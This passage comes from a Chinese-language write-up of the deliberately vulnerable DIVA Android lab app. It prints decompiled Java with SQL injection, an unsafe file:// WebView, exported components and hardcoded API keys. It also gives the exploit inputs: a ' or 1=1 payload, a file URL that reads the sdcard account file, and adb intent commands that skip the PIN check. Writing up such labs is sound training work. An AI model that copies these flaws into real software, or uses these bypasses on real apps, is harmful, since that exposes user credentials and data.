android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mDB = <span class="built_in">this</span>.openOrCreateDatabase(<span class="string">&quot;sqli&quot;</span>, <span class="number">0</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;DROP TABLE IF EXISTS sqliuser;&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;CREATE TABLE IF NOT EXISTS sqliuser(user VARCHAR, password VARCHAR, credit_card VARCHAR);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO sqliuser VALUES (\&#x27;admin\&#x27;, \&#x27;passwd123\&#x27;, \&#x27;1234567812345678\&#x27;);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO sqliuser VALUES (\&#x27;diva\&#x27;, \&#x27;p@ssword\&#x27;, \&#x27;1111222233334444\&#x27;);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO sqliuser VALUES (\&#x27;john\&#x27;, \&#x27;password123\&#x27;, \&#x27;5555666677778888\&#x27;);&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva-sqli&quot;</span>, <span class="string">&quot;Error occurred while creating database for SQLI: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040029</span>);  <span class="comment">// layout:activity_sqlinjection</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">search</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">srchtxt</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0099</span>);  <span class="comment">// id:ivi1search</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Cursor</span> <span class="variable">cursor0</span> <span class="operator">=</span> <span class="built_in">this</span>.mDB.rawQuery(<span class="string">&quot;SELECT * FROM sqliuser WHERE user = \&#x27;&quot;</span> + srchtxt.getText().toString() + <span class="string">&quot;\&#x27;&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">strb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cursor0 != <span class="literal">null</span> &amp;&amp; cursor0.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                cursor0.moveToFirst();</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    strb.append(<span class="string">&quot;User: (&quot;</span> + cursor0.getString(<span class="number">0</span>) + <span class="string">&quot;) pass: (&quot;</span> + cursor0.getString(<span class="number">1</span>) + <span class="string">&quot;) Credit card: (&quot;</span> + cursor0.getString(<span class="number">2</span>) + <span class="string">&quot;)\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(cursor0.moveToNext());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                strb.append(<span class="string">&quot;User: (&quot;</span> + srchtxt.getText().toString() + <span class="string">&quot;) not found&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, strb.toString(), <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva-sqli&quot;</span>, <span class="string">&quot;Error occurred while searching in database: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1‘ or 1=1</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230325182536117.png" alt="image-20230325182536117"></p>
<h2 id="输入校验问题—第二部分"><a href="#输入校验问题—第二部分" class="headerlink" title="输入校验问题—第二部分"></a>输入校验问题—第二部分</h2><p>代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InputValidation2URISchemeActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">uriText</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0081</span>);  <span class="comment">// id:ivi2uri</span></span><br><span class="line">        ((WebView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0083</span>)).loadUrl(uriText.getText().toString());  <span class="comment">// id:ivi2wview</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040021</span>);  <span class="comment">// layout:activity_input_validation2_urischeme</span></span><br><span class="line">        ((WebView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0083</span>)).getSettings().setJavaScriptEnabled(<span class="literal">true</span>);  <span class="comment">// id:ivi2wview</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将http协议换成File协议，查看之前存储在sd卡的账号文件</p>
<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///mnt/sdcard/.uinfo.txt</span><br></pre></td></tr></table></figure>

<h3 id="webview域控制不严格漏洞"><a href="#webview域控制不严格漏洞" class="headerlink" title="webview域控制不严格漏洞"></a>webview域控制不严格漏洞</h3><p>先看Android里的WebViewActivity.java，当其他应用启动此 Activity 时， intent 中的 data 直接被当作 url 来加载（假定传进来的 url 为 file:&#x2F;&#x2F;&#x2F;data&#x2F;local&#x2F;tmp&#x2F;attack.html ），其他 APP 通过使用显式 ComponentName 或者其他类似方式就可以很轻松的启动该WebViewActivity 并加载恶意url。</p>
<p>解决方案：</p>
<p>对于不需要使用 file 协议的应用，禁用 file 协议.</p>
<p>对于需要使用 file 协议的应用，禁止 file 协议加载 JavaScript。</p>
<p>方法分析：</p>
<p>1、setAllowFileAccess()<br>使用 file 域加载的 js代码能够使用进行同源策略跨域访问，从而导致隐私信息泄露，如果不允许使用 file 协议，则不会存在上述的威胁，但同时也限制了 WebView 的功能，使其不能加载本地的 html 文件。</p>
<p>2、setAllowFileAccessFromFileURLs()<br>设置为false，禁止从 file url 中加载的 js 代码读取其它本地文件，在Android 4.1前默认允许，在Android 4.1后默认禁止。</p>
<p>3、setAllowUniversalAccessFromFileURLs()<br>设置为false，禁止从 file url 中加载的 js 代码可以访问其他的源(包括http、https等源)。</p>
<h2 id="访问控制问题—第一部分"><a href="#访问控制问题—第一部分" class="headerlink" title="访问控制问题—第一部分"></a>访问控制问题—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccessControl1Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040019</span>);  <span class="comment">// layout:activity_access_control1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewAPICredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        i.setAction(<span class="string">&quot;jakhar.aseem.diva.action.VIEW_CREDS&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(i.resolveActivity(<span class="built_in">this</span>.getPackageManager()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.startActivity(i);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Error while getting API details&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        Log.e(<span class="string">&quot;Diva-aci1&quot;</span>, <span class="string">&quot;Couldn\&#x27;t resolve the Intent VIEW_CREDS to our activity&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@shamu:/ # am start jakhar.aseem.diva/.APICredsActivity</span><br><span class="line">Starting: Intent &#123; act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=jakhar.aseem.diva/.APICredsActivity &#125;</span><br><span class="line"></span><br><span class="line">am start -n jakhar.aseem.diva/jakhar.aseem.diva.APICredsActivity</span><br><span class="line">am start -n jakhar.aseem.diva/.APICredsActivity -a jakhar.aseem.diva.action.VIEW_CREDS</span><br></pre></td></tr></table></figure>

<p>对应解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">中文解释下：am start jakhar.aseem.diva/.APICredsActivity</span><br><span class="line">这是一个Android系统中的命令，用于启动一个应用程序的特定活动（Activity）。其中，“am”代表Activity Manager，它是一个管理Android应用程序中活动（Activity）的系统服务。</span><br><span class="line">具体来说，“start”是am命令的一种操作类型，用于启动一个活动。接下来是“jakhar.aseem.diva”，它代表应用程序的包名，即Diva应用程序的包名。最后是“/.APICredsActivity”，它代表要启动的具体活动名称，即APICredsActivity。因此，该命令的含义是启动名为APICredsActivity的Diva应用程序活动。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为什么/.APICredsActivity 有个点</span><br><span class="line">在 Android 中，点号（.）在活动（Activity）名称前面表示该活动是应用程序的子活动，即它是在包含该活动的应用程序的命名空间中定义的。因此，点号（.）后面跟着的是子活动的名称，而不是完整的活动类名。这样可以简化指定活动名称的过程，并使活动名称更具可读性。</span><br><span class="line">在这个例子中，由于点号（.）在活动名称前面，因此它表示 APICredsActivity 是 Diva 应用程序的子活动，即该活动是在 Diva 应用程序的命名空间中定义的。这样就不需要指定完整的活动类名，只需指定子活动名称即可。</span><br><span class="line"></span><br><span class="line">如果不使用点号，那么在命令中应该指定完整的活动类名。例如，如果要启动 Diva 应用程序中的 APICredsActivity，可以使用以下命令：</span><br><span class="line">am start -n jakhar.aseem.diva/jakhar.aseem.diva.APICredsActivity</span><br><span class="line">其中，“-n”选项用于指定要启动的活动的完整类名，其中包括应用程序包名和活动名称。所以，上面的命令将启动 jakhar.aseem.diva 应用程序中的 jakhar.aseem.diva.APICredsActivity 活动。</span><br></pre></td></tr></table></figure>

<h2 id="访问控制问题—第二部分"><a href="#访问控制问题—第二部分" class="headerlink" title="访问控制问题—第二部分"></a>访问控制问题—第二部分</h2><p>代码：</p>
<p>accesscontrolaction：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.RadioButton;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccessControl2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001A</span>);  <span class="comment">// layout:activity_access_control2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewAPICredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">RadioButton</span> <span class="variable">rbregnow</span> <span class="operator">=</span> (RadioButton)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C006D</span>);  <span class="comment">// id:aci2rbregnow</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">z</span> <span class="operator">=</span> rbregnow.isChecked();</span><br><span class="line">        i.setAction(<span class="string">&quot;jakhar.aseem.diva.action.VIEW_CREDS2&quot;</span>);</span><br><span class="line">        i.putExtra(<span class="built_in">this</span>.getString(<span class="number">0x7F060026</span>), ((<span class="type">boolean</span>)(((<span class="type">int</span>)z))));  <span class="comment">// string:chk_pin &quot;check_pin&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(i.resolveActivity(<span class="built_in">this</span>.getPackageManager()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.startActivity(i);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Error while getting Tveeter API details&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        Log.e(<span class="string">&quot;Diva-aci1&quot;</span>, <span class="string">&quot;Couldn\&#x27;t resolve the Intent VIEW_CREDS2 to our activity&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>API ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APICreds2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001E</span>);  <span class="comment">// layout:activity_apicreds2</span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">apicview</span> <span class="operator">=</span> (TextView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0077</span>);  <span class="comment">// id:apic2TextView</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pintext</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0078</span>);  <span class="comment">// id:aci2pinText</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">vbutton</span> <span class="operator">=</span> (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0079</span>);  <span class="comment">// id:aci2button</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">this</span>.getIntent().getBooleanExtra(<span class="built_in">this</span>.getString(<span class="number">0x7F060026</span>), <span class="literal">true</span>)) &#123;  <span class="comment">// string:chk_pin &quot;check_pin&quot;</span></span><br><span class="line">            apicview.setText(<span class="string">&quot;TVEETER API Key: secrettveeterapikey\nAPI User name: diva2\nAPI Password: p@ssword2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        apicview.setText(<span class="string">&quot;Register yourself at http://payatu.com to get your PIN and then login with that PIN!&quot;</span>);</span><br><span class="line">        pintext.setVisibility(<span class="number">0</span>);</span><br><span class="line">        vbutton.setVisibility(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewCreds</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Invalid PIN. Please try again&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>试下使用老套路：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell am start -n jakhar.aseem.diva/.APICreds2Activity -a jakhar.aseem.diva.action.VIEW_CREDS2</span><br></pre></td></tr></table></figure>

<p>失败</p>
<p>过程：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释下：adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false</span><br><span class="line"></span><br><span class="line">这是一个 Android adb shell 命令，它用于在 Diva 应用程序中启动 APICreds2Activity 活动，并传递一些参数。下面对该命令的各个部分进行解释：</span><br><span class="line"></span><br><span class="line">adb shell</span><br><span class="line">这是一个命令行工具，可以在 Android 设备的 shell 终端中运行命令。</span><br><span class="line"></span><br><span class="line">am start</span><br><span class="line">这是一个 Android shell 命令，用于启动一个活动。在这个命令中，通过指定“-a”选项和“-n”选项来指定要启动的活动。</span><br><span class="line"></span><br><span class="line">-a jakhar.aseem.diva.action.VIEW_CREDS2</span><br><span class="line">这个选项指定要启动的活动的 Action，即 jakhar.aseem.diva.action.VIEW_CREDS2。这是一个自定义的 Action，用于指示要启动的是 APICreds2Activity 活动。</span><br><span class="line"></span><br><span class="line">-n jakhar.aseem.diva/.APICreds2Activity</span><br><span class="line">这个选项指定要启动的活动的 ComponentName，即 jakhar.aseem.diva/.APICreds2Activity。其中，jakhar.aseem.diva 是应用程序的包名，APICreds2Activity 是要启动的活动的类名。</span><br><span class="line"></span><br><span class="line">--ez check_pin false</span><br><span class="line">这个选项用于传递一个额外参数给 APICreds2Activity 活动。其中，check_pin 是一个布尔类型的参数名，表示是否需要检查输入的 PIN 码是否正确。false 表示不需要检查。这个参数将在 APICreds2Activity 的 onCreate 方法中被使用，以确定显示哪种类型的凭据信息。</span><br><span class="line"></span><br><span class="line">综上所述，这个命令的作用是启动 Diva 应用程序中的 APICreds2Activity 活动，并传递一个额外参数，以确定显示哪种类型的凭据信息。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是什么意思：i.setAction(&quot;jakhar.aseem.diva.action.VIEW_CREDS2&quot;);</span><br><span class="line">这段代码是在创建一个 Intent 对象，并使用 setAction() 方法设置了它的 Action 属性为 &quot;jakhar.aseem.diva.action.VIEW_CREDS2&quot;。这个 Action 是自定义的，用于指示要启动 Diva 应用程序中的 APICreds2Activity 活动。可以使用这个 Intent 对象来启动相应的活动或服务。</span><br></pre></td></tr></table></figure>



<h2 id="访问控制问题—第三部分"><a href="#访问控制问题—第三部分" class="headerlink" title="访问控制问题—第三部分"></a>访问控制问题—第三部分</h2><p>代码：</p>
<p>activity：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences.Editor;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.preference.PreferenceManager;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccessControl3Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addPin</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        SharedPreferences.<span class="type">Editor</span> <span class="variable">sharedPreferences$Editor0</span> <span class="operator">=</span> PreferenceManager.getDefaultSharedPreferences(<span class="built_in">this</span>).edit();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> ((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0070</span>)).getText().toString();  <span class="comment">// id:aci3Pin</span></span><br><span class="line">        <span class="keyword">if</span>(s == <span class="literal">null</span> || (s.isEmpty())) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Please Enter a valid pin!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Button</span> <span class="variable">vbutton</span> <span class="operator">=</span> (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0072</span>);  <span class="comment">// id:aci3viewbutton</span></span><br><span class="line">        sharedPreferences$Editor0.putString(<span class="built_in">this</span>.getString(<span class="number">0x7F06004A</span>), s);  <span class="comment">// string:pkey &quot;notespin&quot;</span></span><br><span class="line">        sharedPreferences$Editor0.commit();</span><br><span class="line">        <span class="keyword">if</span>(vbutton.getVisibility() != <span class="number">0</span>) &#123;</span><br><span class="line">            vbutton.setVisibility(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;PIN Created successfully. Private notes are now protected with PIN&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">goToNotes</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.startActivity(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, AccessControl3NotesActivity.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001B</span>);  <span class="comment">// layout:activity_access_control3</span></span><br><span class="line">        <span class="keyword">if</span>(!PreferenceManager.getDefaultSharedPreferences(<span class="built_in">this</span>).getString(<span class="built_in">this</span>.getString(<span class="number">0x7F06004A</span>), <span class="string">&quot;&quot;</span>).isEmpty()) &#123;  <span class="comment">// string:pkey &quot;notespin&quot;</span></span><br><span class="line">            ((Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0072</span>)).setVisibility(<span class="number">0</span>);  <span class="comment">// id:aci3viewbutton</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>xml文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:authorities</span>=<span class="string">&quot;jakhar.aseem.diva.provider.notesprovider&quot;</span> <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;jakhar.aseem.diva.NotesProvider&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里使用了ContentProvider，android:enabled表示是否能由系统初始化，android:exported表示是否能被其他应用使用，android:authorities标识这个ContentProvider，调用者可以根据这个标识来找到它，看到2个值都为true，我们就可以使用content:&#x2F;&#x2F;访问里面的数据了，查看包含content:&#x2F;&#x2F;的字符串文件apktool&#x2F;diva-beta&#x2F;smali&#x2F;jakhar&#x2F;aseem&#x2F;diva&#x2F;NotesProvider.smali。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell content query –-uri content://jakhar.aseem.diva.provider.notesprovider/notes</span><br></pre></td></tr></table></figure>

<p>没太懂这里，以后需要深入了解安卓再来学学。</p>
<h2 id="硬编码—第二部分"><a href="#硬编码—第二部分" class="headerlink" title="硬编码—第二部分"></a>硬编码—第二部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hardcode2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DivaJni djni;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">access</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">hckey</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C007E</span>);  <span class="comment">// id:hc2Key</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.djni.access(hckey.getText().toString()) != <span class="number">0</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access granted! See you on the other side :)&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access denied! See you in hell :D&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040020</span>);  <span 